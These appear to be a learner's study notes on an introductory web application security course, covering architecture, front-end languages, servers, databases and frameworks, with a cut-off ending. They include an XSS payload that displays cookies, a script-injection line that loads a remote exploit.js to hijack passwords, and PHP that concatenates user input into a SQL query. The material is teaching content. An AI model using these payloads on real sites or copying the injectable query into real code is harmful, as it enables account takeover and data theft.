# Introduction to Web Applications

- [Introduction](#intro)
- [Web Application Layout](#web-app-layout)
- [Frontend vs Backend](#frontend-vs-backend)
- [HTML](#html)
- [CSS](#css)
- [Javascript](#javascript)
- [Sensitive Data Exposure](#sensitive-data-exposure)
- [Cross-Site Scripting](#xss)
- [Cross-Site Request Forgery](#csrf)
- [Back End Servers](#backend-servers)
- [Web Servers](#web-servers)
- [Databases](#databases)
- [Developer Frameworks & APIs](#api)
- [Common Web Vulnerabilities](#common-web-vulnerabilities)
- [Public Vulnerabilities](#public-vulnerabilities)


## Introduction

### What Are Web Applications?

- Web applications are **interactive programs** that run on web browsers.
- They follow a **client-server model**, where:
  - The **client-side** (frontend) handles what the user sees and interacts with.
  - The **server-side** (backend) manages business logic and data handling (like databases).
- Examples:
  - Email clients like **Gmail**
  - Retailers like **Amazon**
  - Document tools like **Google Docs**

### Characteristics of Web Applications

- Accessible from anywhere with an internet connection.
- Can be hosted on various platforms by any developer (not just big companies).
- Used by billions daily across many domains.

---

### Web Applications vs. Websites

| Aspect | Traditional Websites | Web Applications |
|--------|----------------------|------------------|
| Interactivity | Static, no real-time changes | Dynamic, responsive to input |
| Technology | Web 1.0 (e.g., simple HTML pages) | Web 2.0 (dynamic & modular) |
| Editing Content | Manual developer intervention | Real-time updates via UI |
| Features | Limited, mostly read-only | Full functionality, like forms, buttons, etc. |
| Display | Often fixed layout | Modular, responsive to screen size |

---

### Web Applications vs. Native OS Applications

| Feature | Web Applications | Native OS Applications |
|--------|------------------|-------------------------|
| Platform | Runs in any browser, platform-independent | Tied to specific OS (e.g., Windows/Mac) |
| Installation | No installation required | Must be installed |
| Updates | Centralized, server-based | Per-device, per-user |
| Storage | Minimal client-side storage | Consumes local disk |
| Speed | Slower, relies on browser | Faster, uses local resources |
| Examples | Gmail, Google Docs | Microsoft Word, Adobe Photoshop |

> Hybrid/Progressive Web Apps combine both worlds — running in a browser but using native OS features.

---

### Web Application Distribution

#### Open Source Examples:
- **WordPress**
- **OpenCart**
- **Joomla**

#### Closed Source Examples:
- **Wix**
- **Shopify**
- **DotNetNuke**

> Open source apps allow customization and community contributions. Closed source apps are proprietary and often sold under license or subscriptions.

---

### Security Risks of Web Applications

- **Always online** and accessible by anyone → large attack surface.
- Vulnerable to both **automated** and **manual attacks**.
- Common risks:
  - Unauthorized access to **databases** or **internal systems**
  - Data breaches due to **XSS**, **SQLi**, and **misconfigurations**

#### Security Testing is Critical:
- Run **frequent web app penetration tests**.
- Use secure coding practices **at every stage** of development.
- Refer to OWASP’s Web Security Testing Guide for best practices.

---

### Attacking Web Applications

#### Common Vulnerabilities:
- **SQL Injection** (SQLi)
- **File Upload/Remote Code Execution**
- **Cross-Site Scripting (XSS)**
- **Broken Access Control**
- **IDOR (Insecure Direct Object Reference)**

#### Real-World Exploit Scenarios:
| Flaw | Example |
|------|---------|
| **SQL Injection** | Stealing usernames/passwords via login fields |
| **File Inclusion** | Reading internal files or executing malicious ones |
| **Unrestricted Upload** | Uploading web shells |
| **IDOR** | Changing `user_id=701` to `702` to access another user’s profile |
| **Broken Access Control** | Manipulating `roleid=3` to gain admin during registration |

#### Pen Testers Look For:
- Login pages and input forms
- Known CMS platforms (WordPress, Joomla)
- Misconfigured permissions
- Chained vulnerabilities (e.g., file upload + RCE + SQLi)

---

### Summary

- Web applications are everywhere and form the core of modern web interaction.
- Their **interactivity**, **modularity**, and **accessibility** come at the cost of **increased attack surface**.
- Understanding the **architecture**, **distribution**, and **security risks** of web applications is critical for penetration testers.
- You must learn to think **offensively** (to find vulnerabilities) and **defensively** (to protect against them).

> This foundation will help you analyze any web app you encounter — whether in labs, real-world engagements, or bug bounty work.

--

## Web Application Layout

Web applications vary greatly in structure depending on their purpose and design. Understanding their layout helps identify vulnerabilities during security assessments. A typical web app can be broken down into three main categories:

| **Category**                     | **Description**                                                                                                                                                 |
|----------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **Web Application Infrastructure** | Structure of components (like servers and databases) required for the application to run.                                                                      |
| **Web Application Components**     | The pieces that make up the application (Client, UI/UX, Server).                                                                                               |
| **Web Application Architecture**   | The relationships and interactions between all components.                                                                                                     |

---

### Web Application Infrastructure

These are the models that describe how infrastructure is structured:

- **Client-Server**
- **One Server**
- **Many Servers - One Database**
- **Many Servers - Many Databases**

**Client-Server**  
Classic architecture: the client (browser) interacts with the UI, sends HTTP requests to the server, and receives readable responses.  
> _"This website we are currently interacting with is also a web application, developed and hosted by Hack The Box (webserver), and we access it and interact with it using our web browser (client).”_

**One Server**  
Everything (UI, logic, DB) runs on one machine. Simple and cheap but risky. A single compromise brings down all hosted apps.  
> _“All eggs in one basket.”_

**Many Servers - One Database**  
Multiple apps or copies of the same app connect to a shared database. The DB is hosted separately.  
+ Segmentation adds security: compromising one server doesn't necessarily expose others.

**Many Servers - Many Databases**  
Each app has its own server and its own database. Often used for redundancy or segmentation.  
+ May use **load balancers** for availability and performance.

**Other architectures**  
- **Serverless**: cloud-managed (e.g., AWS Lambda)
- **Microservices**: app broken into small task-specific services

---

### Web Application Components

Each app generally has:

1. **Client**
2. **Server**
   - Webserver
   - Application Logic
   - Database
3. **Services**
   - Microservices
   - 3rd Party Integrations
4. **Functions**
   - Serverless functions

---

### Web Application Architecture

Three-tier model:

| **Layer**            | **Description**                                                                 |
|----------------------|---------------------------------------------------------------------------------|
| **Presentation Layer** | UI logic, client interaction. HTML/JS/CSS rendered in browser.                 |
| **Application Layer**  | Handles logic like authentication, data routing, user privileges, etc.         |
| **Data Layer**         | Works with app layer to read/write structured data from databases.             |

---

### Microservices

Split into independent components like:

- Registration
- Search
- Payments
- Reviews

Each component:
- Is **stateless**
- Stores data **separately**
- Can be written in any language
- Communicates via APIs

**Benefits**:
- Agility  
- Scaling  
- Deployment speed  
- Reusable code  
- Fault tolerance

---

### Serverless

Apps run in containers managed by cloud providers (e.g., AWS, GCP, Azure).  
+ No infrastructure management  
+ Ideal for scalability and flexibility  
+ Example: apps run in Docker, triggered by events

---

### Architecture Security

- **Design flaws** may create vulnerabilities, not just bad code.
- **RBAC** (Role-Based Access Control) is crucial. Missing it may expose admin functions.
- **Hidden database locations** or misconfigured access must be tested thoroughly.
- Pen testing must address **architecture** as much as **implementation**.

---

## Front End vs. Back End

Web development is often split into two major categories: **Front End** and **Back End** development. Together, they make up the full stack of a modern web application. While they are both essential, they serve different purposes and involve different skill sets, technologies, and responsibilities.

---

### 🔹 Front End

The **Front End** of a web application is what the user interacts with directly through their browser. It is also known as the *client-side*.

#### Technologies Commonly Used:
- **HTML** – Structure of the page.
- **CSS** – Styling and layout.
- **JavaScript** – Behavior and interactivity.

#### Responsibilities:
- Designing and building the **user interface (UI)**.
- Creating **responsive layouts** that work across devices.
- Ensuring **good user experience (UX)**.
- Handling **client-side form validation**.
- Communicating with the **back end** via HTTP requests (e.g., AJAX, fetch API).

#### Tools & Frameworks:
- React, Vue.js, Angular
- Bootstrap, Tailwind CSS
- Figma, Adobe XD (for design)

#### Developer Focus:
- Visuals and interactivity
- Performance on user devices
- Accessibility and usability

---

### 🔹 Back End

The **Back End** is where the core logic and data operations happen. It is executed on the **server-side**, and typically not directly seen by users.

#### Technologies Commonly Used:
- Languages: PHP, Python, Java, C#, Node.js
- Databases: MySQL, PostgreSQL, MongoDB
- Servers: Apache, NGINX, IIS

#### Responsibilities:
- Managing the **database** and storing application data securely.
- Implementing **application logic** (e.g., authentication, business rules).
- Setting up **APIs** to serve the front end.
- Handling **user sessions** and cookies.
- Ensuring **security** and data validation.

#### Tools & Frameworks:
- Laravel, Django, Flask, Spring Boot
- Express.js (for Node.js)
- Docker, Kubernetes (for containerization)

#### Developer Focus:
- Performance on server-side
- Scalability and robustness
- Data security and access control

---

### 🔁 How They Work Together

When a user interacts with a front end element, such as clicking a "Submit" button, the front end sends a request (often HTTP) to the back end. The back end processes the logic, queries the database, and returns the result, which is then presented to the user by the front end.

Example:  
- A user logs in via a form on the front end.  
- The front end sends the credentials to the back end.  
- The back end verifies them, starts a session, and sends a response.  
- The front end displays a dashboard.

---

### 🛡️ Securing Front and Back Ends

It’s critical to secure both sides of the stack:
- **Front End**: Prevent XSS, input validation, secure cookie handling.
- **Back End**: Avoid SQL injection, implement proper access control (RBAC), sanitize data, secure APIs.

---

### ❌ Top Mistakes in Front/Back End Design

Some common missteps include:
1. Failing to validate or sanitize input
2. Relying solely on client-side security
3. Hard-coding secrets or credentials
4. Permitting unverified input to access database queries
5. Lack of access controls and session management

These often lead to OWASP Top 10 vulnerabilities like:
- Broken Access Control
- Injection Attacks
- Insecure Design
- Security Misconfigurations

---

By understanding both **front end** and **back end** clearly, we can effectively identify vulnerabilities and perform complete penetration tests, ensuring no part of the web application is left unchecked.

---

## HTML

HTML (HyperText Markup Language) is the foundational component of the front end of web applications. It defines the structure and content of a web page, including text, headings, links, forms, and other elements. A browser interprets HTML to visually render the page for the user.

---

### Example HTML Document

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Page Title</title>
  </head>
  <body>
    <h1>A Heading</h1>
    <p>A Paragraph</p>
  </body>
</html>
```

---

### HTML Structure

HTML elements follow a tree-like structure (similar to XML). Each element can contain other elements:

```
document
 └── html
     ├── head
     │   └── title
     └── body
         ├── h1
         └── p
```

This hierarchy reflects the nested structure of HTML. Elements have opening and closing tags (e.g. `<p></p>`) and can include attributes like `id` and `class`.

---

### URL Encoding

In HTML and browsers, characters outside the ASCII set or unsafe characters in URLs must be percent-encoded.

Examples:
- `'` becomes `%27`
- Space becomes `%20`
- `&` becomes `%26`

This ensures special characters are correctly interpreted by browsers and servers. Encoding is essential when injecting URLs or crafting payloads.

---

### DOM (Document Object Model)

HTML is modeled as a tree structure known as the **DOM**, which allows dynamic interaction and manipulation using JavaScript.

The DOM is split into:
- **Core DOM** – standard model for all document types
- **XML DOM** – model for XML documents
- **HTML DOM** – model for HTML documents

For example, we can reference a heading tag as `document.h1` or `document.head.title`.

---

### Head and Body Sections

- `<head>`: contains metadata like `<title>`, `<style>`, `<script>` – not rendered directly.
- `<body>`: contains the content the user sees.

---

### Usage in Exploitation

Understanding HTML is critical for web exploitation:
- Locating vulnerable tags (`<script>`, `<input>`, etc.)
- Inserting payloads in forms or tags
- Navigating the DOM for client-side attacks like XSS

---

### Summary

HTML:
- Provides the basic structure of web pages
- Is parsed and rendered by browsers
- Follows a hierarchical, tag-based structure
- Is the target of many client-side security attacks like XSS
- Must be understood to build or break web apps

```html
<p id="para1">Hello</p>
<p id="red-paragraphs">This is red</p>
```

These tag attributes can be referenced or manipulated via CSS or JavaScript for styling or script execution.

---

## CSS (Cascading Style Sheets)

CSS (Cascading Style Sheets) is the stylesheet language used alongside HTML to format and set the style of HTML elements. Like HTML, there are several versions of CSS, and each subsequent version introduces a new set of capabilities that can be used for formatting HTML elements. Browsers are updated alongside it to support these new features.

---

### Example

At a fundamental level, CSS is used to define the style of each class or type of HTML elements (i.e., `body` or `h1`), such that any element within that page would be represented as defined in the CSS file. This could include the font family, font size, background color, text color and alignment, and more.

To define basic styles, you might write:

```css
body {
  background-color: black;
}

h1 {
  color: white;
  text-align: center;
}

p {
  font-family: helvetica;
  font-size: 10px;
}
```

As previously mentioned, this is why we may set unique IDs or class names for certain HTML elements so that we can later refer to them within CSS or JavaScript when needed.

---

### Syntax

CSS defines the style of each HTML element or class between curly brackets `{}`, within which the properties are defined with their values (i.e., `element { property: value; }`).

Each HTML element has many properties that can be set through CSS, such as:

- `height`
- `position`
- `border`
- `margin`
- `padding`
- `color`
- `text-align`
- `font-size`

All of these can be combined and used to design visually appealing web pages.

CSS can also be used for animations using properties like:

- `@keyframes`
- `animation`
- `animation-duration`
- `animation-direction`

You can read more and try them out on websites like MDN or [CodePen](https://codepen.io).

---

### Usage

CSS is often used alongside JavaScript to:

- Make quick calculations
- Dynamically adjust style properties based on user input
- Create animations or transitions based on user interaction

These capabilities make it easier to create user-friendly and visually stunning applications.

Furthermore, CSS can be used in combination with:

- `XML` (e.g., styling SVG graphics)
- `SVG` elements
- Modern mobile platforms (e.g., for styling UIs)

---

### Frameworks

While CSS can be written from scratch, it is often more efficient to use frameworks. These frameworks offer predefined styles and components that make development faster and more consistent.

Common CSS frameworks include:

- **Bootstrap**
- **SASS**
- **Foundation**
- **Bulma**
- **Pure**

These frameworks are optimized for web applications, often designed to work well with JavaScript, and are widely adopted in modern front-end development.

---

## JavaScript

JavaScript is one of the most used languages in the world. It is mostly used for web development and mobile development. **JavaScript** is usually used on the front end of an application to be executed within a browser. Still, there are implementations of back end JavaScript used to develop entire web applications, like **NodeJS**.

While **HTML** and **CSS** are mainly in charge of how a web page looks, **JavaScript** is usually used to control any functionality that the front end web page requires. Without **JavaScript**, a web page would be mostly static and would not have much functionality or interactive elements.

---

### Example

Within the page source code, **JavaScript** code is loaded with the `<script>` tag, as follows:

```html
<script type="text/javascript">
  ..JavaScript code..
</script>
```

A web page can also load remote **JavaScript** code with `src` and the script’s link:

    <script src="./script.js"></script>

An example of basic use of **JavaScript** within a web page is the following:

    document.getElementById("button1").innerHTML = "Changed Text!";

The above code changes the content of the `button1` HTML element. This is how **JavaScript** can dynamically update and manipulate a page’s content.

> Example:  
> A user clicks a button, and the text on the button changes to “Changed Text!”

---

### Usage

Most common web applications heavily rely on **JavaScript** to drive all needed functionality on the web page, like updating the web page view in real-time, dynamically updating content, accepting and processing user input, and more.

**JavaScript** is also used to automate complex processes and perform HTTP requests to interact with the back end components and send/retrieve data, through technologies like **Ajax**.

In addition to automation, **JavaScript** is often used alongside **CSS** to drive advanced animations that would not be possible with CSS alone.

All modern browsers are equipped with **JavaScript** engines that execute JavaScript code on the client-side without needing the back end. This makes it ideal for performance-sensitive and responsive web interfaces.

---

### Frameworks

As applications grow, using pure **JavaScript** can become inefficient. For this reason, developers use frameworks that simplify and speed up web application development.

These frameworks:

- Enable reuse of components (e.g. login forms, dashboards)
- Help manage user interaction and app state
- Simplify connecting to backends or APIs
- Reduce the need to write HTML manually

Some common **JavaScript** frameworks include:

- **Angular**
- **React**
- **Vue**
- **jQuery**

Frameworks either directly use **JavaScript**, or compile higher-level constructs into JavaScript code to run on the browser.

You can find a comparison of frameworks [here](https://openjsf.org/projects/).

---

## Sensitive Data Exposure

All of the **front end** components we covered are interacted with on the client-side. Therefore, if they are attacked, they do not pose a direct threat to the core **back end** of the web application and usually will not lead to permanent damage. However, as these components are executed on the **client-side**, they put the end-user in danger of being attacked and exploited if they do have any vulnerabilities. If a front end vulnerability is leveraged to attack admin users, it could result in unauthorized access, access to sensitive data, service disruption, and more.

Although the majority of web application penetration testing is focused on back end components and their functionality, it is important also to test front end components for potential vulnerabilities, as these types of vulnerabilities can sometimes be utilized to gain access to sensitive functionality (i.e., an admin panel), which may lead to compromising the entire server.

**Sensitive Data Exposure** refers to the availability of sensitive data in clear-text to the end-user. This is usually found in the **source code** of the web page or page source on the front end of web applications. This is the HTML source code of the application, not to be confused with the back end code that is typically only accessible on the server itself. We can view any website's page source in our browser by right-clicking anywhere on the page and selecting **View Page Source** from the pop-up menu. Sometimes a developer may disable right-clicking on a web application, but this does not prevent us from viewing the page source as we can merely type `ctrl + u` or view the page source through a web proxy such as **Burp Suite**.

Let’s take a look at the google.com page source. Right-click and choose **View Page Source**, and a new tab will open in our browser with the URL `view-source:https://www.google.com/`. Here we can see the **HTML**, **JavaScript**, and external links. Take a moment to browse the page source a bit.

---

### Example

At first glance, this login form does not look like anything out of the ordinary:

```html
<form action="action_page.php" method="post">

  <div class="container">
    <label for="uname"><b>Username</b></label>
    <input type="text" required>

    <label for="psw"><b>Password</b></label>
    <input type="password" required>

    <!-- TODO: remove test credentials test:test -->

    <button type="submit">Login</button>
  </div>

</form>
```

We see that the developers added some comments that they forgot to remove, which contain test credentials:

```html
<!-- TODO: remove test credentials test:test -->
```

The comment seems to be a reminder for the developers to remove the test credentials. Given that the comment has not been removed yet, these credentials may still be valid.

Although it is not very common to find login credentials in developer comments, we can still find various bits of sensitive and valuable information when looking at the source code, such as test pages or directories, debugging parameters, or hidden functionality. There are various automated tools that we can use to scan and analyze available page source code to identify potential paths or directories and other sensitive information.

Leveraging these types of information can give us further access to the web application, which may help us attack the back end components to gain control over the server.

---

### Prevention

Ideally, the front end source code should only contain the code necessary to run all of the web application’s functions, without any extra code or comments that are not necessary for the web application to function properly. It is always important to review the code that will be visible to end-users through the page source or run it through tools to check for exposed information.

It is also important to classify data types within the source code and apply controls on what can or cannot be exposed on the client-side. Developers should also review client-side code to ensure that no unnecessary comments or hidden links are left behind. Furthermore, front end developers may want to use **JavaScript** code packing or obfuscation to reduce the chances of exposing sensitive data through **JavaScript code**. These techniques may prevent automated tools from locating these types of data.

---

## Cross-Site Scripting (XSS)

**HTML Injection** vulnerabilities can often be utilized to also perform **Cross-Site Scripting (XSS)** attacks by injecting **JavaScript** code to be executed on the client-side. Once we can execute code on the victim's machine, we can potentially gain access to the victim's account or even their machine. **XSS** is very similar to **HTML Injection** in practice. However, **XSS** involves the injection of **JavaScript** code to perform more advanced attacks on the client-side, instead of merely injecting HTML code. There are three main types of **XSS**:

| Type         | Description |
|--------------|-------------|
| **Reflected XSS** | Occurs when user input is displayed on the page after processing (e.g., search result or error message). |
| **Stored XSS**    | Occurs when user input is stored in the back end database and then displayed upon retrieval (e.g., posts or comments). |
| **DOM XSS**       | Occurs when user input is directly shown in the browser and is written to an **HTML** DOM object (e.g., vulnerable username or page title). |

In the example we saw for **HTML Injection**, there was no input sanitization whatsoever. Therefore, it may be possible for the same page to be vulnerable to **XSS** attacks. We can try to inject the following **DOM XSS JavaScript** code as a payload, which should show us the cookie value for the current user:

```javascript
<img src=/ onerror=alert(document.cookie)>
```

Once we input our payload and hit *ok*, we see that an alert window pops up with the cookie value in it:

```
cookie=6f1583ba802407f5a624bf5ea4e92067
```

This payload is accessing the **HTML** document tree and retrieving the **cookie** object's value. When the browser processes our input, it will be considered a new **DOM**, and our **JavaScript** will be executed, displaying the cookie value back to us in a popup.

An attacker can leverage this to steal cookie sessions and send them to themselves and attempt to use the cookie value to authenticate to the victim's account. The same attack can be used to perform various types of other attacks against a web application's users. **XSS** is a vast topic that will be covered in-depth in later modules.

---

## Cross-Site Request Forgery (CSRF)

The third type of front end vulnerability that is caused by unfiltered user input is [Cross-Site Request Forgery (CSRF)](https://owasp.org/www-community/attacks/csrf). CSRF attacks may utilize **XSS** vulnerabilities to perform certain queries, and **API** calls on a web application that the victim is currently authenticated to. This would allow the attacker to perform actions as the authenticated user. It may also utilize other vulnerabilities to perform the same functions, like utilizing HTTP parameters for attacks.

A common **CSRF** attack to gain higher privileged access to a web application is to craft a **JavaScript** payload that automatically changes the victim's password to the value set by the attacker. Once the victim views the payload on the vulnerable page (e.g., a malicious comment containing the **JavaScript CSRF** payload), the **JavaScript** code would execute automatically. It would use the victim’s logged-in session to change their password. Once that is done, the attacker can log in to the victim's account and control it.

**CSRF** can also be leveraged to attack admins and gain access to their accounts. Admins usually have access to sensitive functions, which can sometimes be used to attack and gain control over the back-end server (depending on the functionality provided to admins within a given web application). Following this example, instead of using **JavaScript** code that would return the session cookie, we would load a remote `.js` (**JavaScript**) file, as follows:

\````html
"><script src=//www.example.com/exploit.js></script>
\````

The `exploit.js` file would contain the malicious **JavaScript** code that changes the user's password. Developing the `exploit.js` in this case requires knowledge of this web application’s password changing procedure and **APIs**. The attacker would need to create **JavaScript** code that would replicate the desired functionality and automatically carry it out (i.e., **JavaScript** code that changes our password for this specific web application).

---

### Prevention

Though there should be measures on the back end to detect and filter user input, it is also always important to filter and sanitize user input on the front end before it reaches the back end, and especially if this code may be displayed directly on the client-side without communicating with the back end. Two main controls must be applied when accepting user input:

| Type         | Description                                                                                       |
|--------------|---------------------------------------------------------------------------------------------------|
| Sanitization | Removing special characters and non-standard characters from user input before displaying it or storing it. |
| Validation   | Ensuring that submitted user input matches the expected format (i.e., submitted email matched email format)  |

Furthermore, it is also important to sanitize displayed output and clear any special/non-standard characters. In case an attacker manages to bypass front end and back end sanitization and validation filters, it will still not cause any harm on the front end.

Once we sanitize and/or validate user input and displayed output, we should be able to prevent attacks like **HTML Injection** and **XSS**. Another solution would be to implement a [web application firewall (WAF)](https://owasp.org/www-community/Web_Application_Firewall), which can help prevent injection attempts automatically. However, it should be noted that WAF solutions can potentially be bypassed, so developers should follow coding best practices and not merely rely on an appliance to detect/block attacks.

To defend against **XSS**, modern browsers have built-in protections that block the automatic execution of Javascript code. In the case of **CSRF**, most modern web applications include anti-CSRF mechanisms, such as requiring a unique token for each session or request. Additionally, HTTP-level defenses like the `SameSite` cookie attribute (`SameSite=Strict` or `Lax`) can restrict browsers from including authentication cookies in cross-origin requests. Functional protections, like requiring the user to input their password before changing it, can also help mitigate the impact of CSRF. Despite these security measures, they can still be bypassed in certain scenarios. As a result, vulnerabilities like XSS and CSRF continue to pose significant risks to web application users. These defenses should be treated as additional layers of protection, not primary safeguards—developers must ensure that their applications are secure by design and not inherently vulnerable to such attacks.

This [Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) from OWASP discusses the attack and prevention measures in greater detail.

---

## Back End Servers

A **back-end server** is the hardware and operating system on the back end that hosts all of the applications necessary to run the web application. It is the real system running all of the processes and carrying out all of the tasks that make up the entire web application. The back end server would fit in the [Data access layer](https://en.wikipedia.org/wiki/Data_access_layer).

---

### Software

The back end server contains the other 3 back end components:

- **Web Server**
- **Database**
- **Development Framework**

---

#### Visual Overview

The back-end server commonly runs operating systems like **Linux** or **Windows**, and supports software such as:

- **Web Servers**: Apache, NGINX, IIS
- **Web Applications**: PHP, C#, Java
- **Databases**: MySQL, MS SQL, Oracle

---

### Popular Web Server Stacks

There are many popular combinations of “stacks” for back-end servers, which contain a specific set of back end components:

| Combinations | Components |
|--------------|------------|
| **LAMP**     | Linux, Apache, MySQL, and PHP |
| **WAMP**     | Windows, Apache, MySQL, and PHP |
| **WINS**     | Windows, IIS, .NET, and SQL Server |
| **MAMP**     | macOS, Apache, MySQL, and PHP |
| **XAMPP**    | Cross-Platform, Apache, MySQL, and PHP/PERL |

Other software components on the back end server may include **hypervisors**, **containers**, and **WAFs**.

[Here’s a comprehensive list of Web Solution Stacks](https://en.wikipedia.org/wiki/Comparison_of_web_frameworks#Web_solution_stacks)

---

### Hardware

The **back end server** contains all of the necessary hardware. The power and performance capabilities of this hardware determine how stable and responsive the web application will be.

As discussed in the **Architecture** section, modern web applications may:

- **Distribute load** over many back end servers working together.
- **Use virtualized infrastructure** like cloud hosting or data centers.
- Not rely on a single physical machine for hosting.

These systems work together to deliver the web application to the end user efficiently.

---

## Web Servers

A **web server** is an application that runs on the back-end server, which handles all HTTP traffic from the client-side browser, routes it to the requested pages, and finally responds to the client-side browser. Web servers typically run on **TCP ports 80** or **443**, and are responsible for:

- Connecting end-users to various parts of the web application.
- Handling HTTP requests and responses.
- Delivering appropriate HTTP status codes.

---

### Workflow

A web server accepts HTTP requests and responds with different codes:

- `200 OK`: Successful request
- `404 NOT FOUND`: Requested page doesn't exist
- `403 FORBIDDEN`: Access to restricted resource denied

The workflow looks like this:

**Clients (browser/devices) → request → Web Server → response → Clients**

---

### Common HTTP Response Codes

| Code | Description |
|------|-------------|
| `200 OK` | Request succeeded |
| `301 Moved Permanently` | Resource has a new permanent URL |
| `302 Found` | Temporary redirection |
| `400 Bad Request` | Invalid syntax |
| `401 Unauthorized` | Authentication required |
| `403 Forbidden` | Access rights issue |
| `404 Not Found` | Resource doesn't exist |
| `405 Method Not Allowed` | Method is known but not allowed |
| `408 Request Timeout` | Idle connection timeout |
| `500 Internal Server Error` | Unexpected condition |
| `502 Bad Gateway` | Gateway got invalid response |
| `504 Gateway Timeout` | Gateway failed to get timely response |

---

### Handling User Input

Web servers can receive:
- Text
- JSON
- Binary data (e.g., file uploads)

They route and process the request, then return responses. Pages and files the server processes and routes form the web application’s core.

---

### cURL Examples

**Headers only:**

```
curl -I https://academy.hackthebox.com
```

**Source code:**

```
curl https://academy.hackthebox.com
```

These show how we can inspect server responses and webpage source from the terminal.

---

### Languages for Web Servers

Popular languages for building web servers include:

- Python
- JavaScript
- PHP

Each has optimized frameworks for handling large traffic.

---

### Apache

Apache (or `httpd`) is the **most common** web server (~40% of internet websites). It:

- Comes pre-installed on most **Linux** systems.
- Supports **PHP**, **.Net**, **Python**, **Perl**, **CGI**, etc.
- Uses `mod_php` for PHP support.
- Is open-source, highly documented, and widely used by both startups and enterprises.

**Examples of companies using Apache:**

- Apple
- Adobe
- Baidu

---

### NGINX

NGINX is the **second most common** (~30% of internet websites) and serves many **concurrent users** efficiently. It's optimized for:

- **High performance**
- **Low resource usage**
- **Async architecture**

NGINX is especially popular among high-traffic sites. It's free, open-source, and used by:

- Google
- Facebook
- Twitter
- Cisco
- Intel
- Netflix
- HackTheBox

---

### IIS

IIS (Internet Information Services) is the **third most common** (~15% of sites) and is maintained by **Microsoft**. It's commonly used to:

- Host .NET applications
- Support **PHP**, **FTP**, and **Active Directory**
- Run on **Windows Servers**

**Organizations using IIS:**

- Microsoft
- Office365
- Skype
- Stack Overflow
- Dell

Also used with frameworks like:

- Apache Tomcat (Java)
- Node.js (JavaScript)

---

Web servers are crucial in routing requests, handling responses, executing back-end code, and interacting with databases and applications. Apache, NGINX, and IIS dominate the web server market, with various capabilities and use cases depending on traffic, platform, and performance requirements.

---

## Databases

Web applications utilize back end **databases** to store various content and information related to the web application. This can be core web application assets like images and files, web application content like posts and updates, or user data like usernames and passwords. This allows web applications to easily and quickly store and retrieve data and enable dynamic content that is different for each user.

There are many different types of databases, each of which fits a certain type of use. Most developers look for certain characteristics in a database, such as **speed** in storing and retrieving data, **size** when storing large amounts of data, **scalability** as the web application grows, and **cost**.

---

### Relational (SQL)

**Relational** (SQL) databases store their data in tables, rows, and columns. Each table can have unique keys, which can link tables together and create relationships between tables.

For example, we can have a `users` table in a relational database containing columns like `id`, `username`, `first_name`, `last_name`, and so on. The `id` can be used as the table key. Another table, `posts`, may contain posts made by all users, with columns like `id`, `user_id`, `date`, `content`, and so on.

We can link the `id` from the `users` table to the `user_id` in the `posts` table to easily retrieve the user details for each post, without having to store all user details with each post.

A table can have more than one key, as another column can be used as a key to link with another table. For example, the `id` column can be used as a key to link the `posts` table to another table containing comments, each of which belongs to a certain post, and so on.

> The relationship between tables within a database is called a **Schema**.

Some of the most common relational databases include:

| Type       | Description                                                                 |
|------------|-----------------------------------------------------------------------------|
| **MySQL**  | The most commonly used database around the internet. Open-source and free. |
| **MSSQL**  | Microsoft's SQL database. Often used with Windows Servers.                 |
| **Oracle** | Popular with enterprises. Reliable and fast but can be expensive.          |
| **PostgreSQL** | Free, open-source, highly extensible and feature-rich.                |

Other common SQL databases include: **SQLite**, **MariaDB**, **Amazon Aurora**, and **Azure SQL**.

---

### Non-relational (NoSQL)

A **non-relational database** does not use tables, rows, columns, primary keys, relationships, or schemas. Instead, a **NoSQL** database stores data using various storage models, depending on the type of data stored.

Due to the lack of a defined structure for the database, **NoSQL** databases are very scalable and flexible. When dealing with datasets that are not very well defined and structured, a NoSQL database would be the best choice.

Common storage models for NoSQL databases:

- **Key-Value**
- **Document-Based**
- **Wide-Column**
- **Graph**

The **Key-Value** model stores data like:

```
{
  "100001": {
    "date": "01-01-2021",
    "content": "Welcome to this web application."
  },
  "100002": {
    "date": "02-01-2021",
    "content": "This is the first post on this web app."
  },
  "100003": {
    "date": "02-01-2021",
    "content": "Reminder: Tomorrow is the ..."
  }
}
```

This looks similar to a dictionary/map in languages like Python or PHP, i.e. `{"key": "value"}`, where the key is a string and the value can be a string, dictionary, or class.

The **Document-Based** model stores data in complex JSON objects and each object has certain meta-data while storing the rest of the data similarly to the Key-Value model.

Some of the most common NoSQL databases include:

| Type              | Description                                                                 |
|-------------------|-----------------------------------------------------------------------------|
| **MongoDB**        | Most popular NoSQL DB. Document-based. Uses JSON. Free and open-source.   |
| **ElasticSearch**  | Optimized for searching large data. Very fast. Free and open-source.       |
| **Apache Cassandra** | Handles massive data with high availability. Also free and open-source. |

Other common NoSQL databases include: **Redis**, **Neo4j**, **CouchDB**, **Amazon DynamoDB**

---

### Use in Web Applications

Modern web development languages and frameworks make it easy to integrate with databases. But first, the database has to be installed and set up on the back end server.

For example, in PHP with MySQL, once MySQL is up, we can connect to the database server with:

```php
$conn = new mysqli("localhost", "user", "pass");
```

Create a new database:

```php
$sql = "CREATE DATABASE database1";
$conn->query($sql);
```

Connect to it and query:

```php
$conn = new mysqli("localhost", "user", "pass", "database1");
$query = "select * from table_1";
$result = $conn->query($query);
```

Search input from user:

```php
$searchInput = $_POST['findUser'];
$query = "select * from users where name like '%$searchInput%'";
$result = $conn->query($query);
```

Display result back:

```php
while($row = $result->fetch_assoc() ){
  echo $row["name"]."<br>";
}
```

> ⚠️ If not securely coded, database queries like the one above can lead to **SQL Injection** vulnerabilities.

---

## Development Frameworks & APIs

### Overview

As modern web applications grow in complexity, using **development frameworks** helps developers implement common functionality (like user login or session management) more efficiently and securely. Frameworks connect the front end to the back end and are used to create fully functional web applications without starting from scratch.

Common frameworks include:

- **Laravel (PHP)**: Used by startups and smaller companies for its simplicity and power.
- **Express (Node.js)**: Used by PayPal, Yahoo, Uber, IBM, and MySpace.
- **Django (Python)**: Used by Google, YouTube, Instagram, Mozilla, Pinterest.
- **Rails (Ruby)**: Used by GitHub, Hulu, Twitch, Airbnb, Twitter.

> Popular web applications often use multiple frameworks together.

---

### APIs

APIs (Application Programming Interfaces) allow the front end to communicate with the back end. They are essential in modern applications to send and retrieve data via HTTP requests.

---

### Query Parameters

Query parameters send values via **GET** or **POST** requests.

